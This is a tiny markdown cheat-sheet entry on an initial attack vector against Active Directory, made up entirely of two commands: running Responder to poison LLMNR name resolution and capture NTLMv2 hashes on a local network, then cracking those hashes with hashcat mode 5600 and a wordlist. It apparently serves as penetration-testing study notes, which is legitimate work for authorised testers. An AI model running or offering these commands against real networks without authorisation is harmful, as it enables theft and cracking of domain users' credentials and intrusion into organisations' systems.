# AD Initial attack vector

## LLMNR poisoning

```
sudo responder -I <interface> -dwPv
# crack hash
hashcat -m 5600 <hash.txt> <wordlist>
```
